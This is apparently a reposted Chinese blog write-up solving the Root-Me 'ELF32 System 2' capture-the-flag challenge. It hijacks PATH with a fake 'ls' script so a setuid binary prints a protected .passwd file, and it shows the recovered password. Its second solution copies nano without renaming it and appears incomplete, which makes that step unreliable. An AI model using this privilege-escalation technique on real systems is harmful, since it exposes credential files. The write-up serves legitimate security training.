<!--yml
category: 未分类
date: 2022-04-26 14:19:17
-->

# CTF-rootme 题解之Bash - System 2_weixin_30508309的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30508309/article/details/99600324](https://blog.csdn.net/weixin_30508309/article/details/99600324)

LINK:[https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)

SourceCode:

```
 #include <stdlib.h>
    #include <stdio.h>

    int main(){
            system("**ls -lA /challenge/app-script/ch12/.passwd**");
            return 0;
    } 
```

**The target is to change 'ls' command as 'cat /challenge/app-script/ch12/.passwd'**

**the execution result change to:**cat /challenge/app-script/ch12/.passwd **-lA /challenge/app-script/ch12/.passwd******

app-script-ch12@challenge02:~$ **ls -l ch12**

-r-**s**r-x--- 1 app-script-ch12-cracked app-script-ch12 7160 Aug 11  2015 ch12           (suid programm,could be execute as root)

******Solution 1:****** 

app-script-ch12@challenge02:~$******mkdir /tmp/ch12/****** 

app-script-ch12@challenge02:~$************echo '#!/bin/sh' >/tmp/ch12/ls************

app-script-ch12@challenge02:~$************************echo 'cat '****************** **********************/challenge/app-script/ch12/.passwd********************** ******************>>/tmp/ch12/ls************************

app-script-ch12@challenge02:~$************************chmod +x****************** ******************/tmp/ch12/ls************************

app-script-ch12@challenge02:~$************************export PATH=************************/tmp/ch12/************************:$PATH************************

app-script-ch12@challenge02:~$************************************************/challenge/app-script/ch12/ch12 ************************************************

************************************************8a95eDS/*e_T#************************************************

************************************************Solution 2:************************************************

app-script-ch12@challenge02:~$mkdir /tmp/ch12/

app-script-ch12@challenge02:~$cp /bin/nano /tmp/ch12/

 app-script-ch12@challenge02:~$export PATH=/tmp/ch12/:$PATH

app-script-ch12@challenge02:~$/challenge/app-script/ch12/ch12